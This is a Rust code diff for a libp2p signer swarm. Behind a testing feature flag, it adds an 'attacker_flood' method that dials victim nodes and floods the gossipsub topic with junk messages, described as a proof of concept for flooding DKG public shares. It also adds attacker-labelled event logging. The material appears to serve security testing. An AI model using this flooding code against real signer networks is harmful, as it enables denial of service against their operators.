@@ -517,6 +517,46 @@ impl SignerSwarmBuilder {
     }
 }
 
+#[cfg(feature = "testing")]
+fn log_swarm_event(event: Option<libp2p::swarm::SwarmEvent<SignerBehaviorEvent>>) {
+    use libp2p::swarm::SwarmEvent;
+    match event {
+        Some(SwarmEvent::ConnectionEstablished {
+            peer_id,
+            endpoint,
+            num_established,
+            ..
+        }) => {
+            tracing::info!(%peer_id, ?endpoint, %num_established, "attacker connected");
+        }
+        Some(SwarmEvent::ConnectionClosed { peer_id, cause, num_established, .. }) => {
+            tracing::warn!(%peer_id, %num_established, ?cause, "attacker connection closed");
+        }
+        Some(SwarmEvent::OutgoingConnectionError { peer_id, error, .. }) => {
+            tracing::error!(?peer_id, %error, "attacker outgoing connection error");
+        }
+        Some(SwarmEvent::IncomingConnectionError { error, .. }) => {
+            tracing::warn!(%error, "attacker incoming connection error");
+        }
+        Some(SwarmEvent::Dialing { peer_id, .. }) => {
+            tracing::debug!(?peer_id, "attacker dialing");
+        }
+        Some(SwarmEvent::Behaviour(SignerBehaviorEvent::Gossipsub(ev))) => {
+            tracing::info!(?ev, "attacker gossipsub event");
+        }
+        Some(SwarmEvent::Behaviour(SignerBehaviorEvent::Identify(ev))) => {
+            tracing::info!(?ev, "attacker identify event");
+        }
+        Some(SwarmEvent::Behaviour(SignerBehaviorEvent::Ping(ev))) => {
+            tracing::debug!(?ev, "attacker ping event");
+        }
+        Some(other) => {
+            tracing::trace!(?other, "attacker swarm event");
+        }
+        None => {}
+    }
+}
+
 #[derive(Clone)]
 pub struct SignerSwarm {
     keypair: Keypair,
@@ -529,6 +569,89 @@ impl SignerSwarm {
     /// Get the local peer ID of the signer.
     pub fn local_peer_id(&self) -> PeerId {
         PeerId::from_public_key(&self.keypair.public())
+    }
+
+    /// Subscribe to the gossipsub topic, dial the provided victims and
+    /// then publish freshly-built junk messages as fast as this loop can
+    /// drive the swarm. Intended for the DKG-public-shares flooding PoC
+    /// — see `signer/examples/dkg_flood.rs`.
+    ///
+    /// This future never returns: the attacker keeps the swarm running
+    /// for the entire lifetime of the process. Interesting swarm events
+    /// (connections, publish outcomes) are logged via `tracing`.
+    #[cfg(feature = "testing")]
+    pub async fn attacker_flood<F>(&self, dials: Vec<Multiaddr>, make: F) -> !
+    where
+        F: Fn(u64) -> Vec<u8>,
+    {
+        use futures::StreamExt as _;
+
+        let mut swarm = self.swarm.lock().await;
+        tracing::info!(local_peer_id = %swarm.local_peer_id(), "attacker swarm starting");
+
+        swarm
+            .behaviour_mut()
+            .gossipsub
+            .subscribe(&super::TOPIC)
+            .expect("failed to subscribe to gossipsub topic");
+
+        for addr in &dials {
+            match swarm.dial(DialOpts::unknown_peer_id().address(addr.clone()).build()) {
+                Ok(()) => tracing::info!(%addr, "dialing victim"),
+                Err(error) => tracing::error!(%addr, %error, "dial failed"),
+            }
+        }
+
+        // Give the mesh a moment to form so gossipsub actually forwards
+        // our first messages instead of dropping them for lack of peers.
+        let mesh_deadline = tokio::time::Instant::now() + Duration::from_secs(6);
+        while tokio::time::Instant::now() < mesh_deadline {
+            tokio::select! {
+                event = swarm.next() => log_swarm_event(event),
+                _ = tokio::time::sleep(Duration::from_millis(50)) => {}
+            }
+        }
+
+        let mut published: u64 = 0;
+        let mut errored: u64 = 0;
+        let mut last_report = tokio::time::Instant::now();
+        let report_every = Duration::from_secs(2);
+        let mut i: u64 = 0;
+        loop {
+            let payload = make(i);
+            let size = payload.len();
+            match swarm
+                .behaviour_mut()
+                .gossipsub
+                .publish(super::TOPIC.hash(), payload)
+            {
+                Ok(_) => {
+                    published += 1;
+                }
+                Err(error) => {
+                    errored += 1;
+                    tracing::trace!(%error, size, "publish failed");
+                }
+            }
+            i = i.wrapping_add(1);
+
+            if last_report.elapsed() >= report_every {
+                let peers: Vec<_> = swarm.connected_peers().collect();
+                tracing::info!(
+                    published,
+                    errored,
+                    peers = peers.len(),
+                    payload_size = size,
+                    "flood status"
+                );
+                last_report = tokio::time::Instant::now();
+            }
+
+            tokio::select! {
+                event = swarm.next() => log_swarm_event(event),
+                _ = tokio::time::sleep(Duration::from_millis(1)) => {}
+            }
+        }
     }
 
     /// Get the current listen addresses of the swarm.
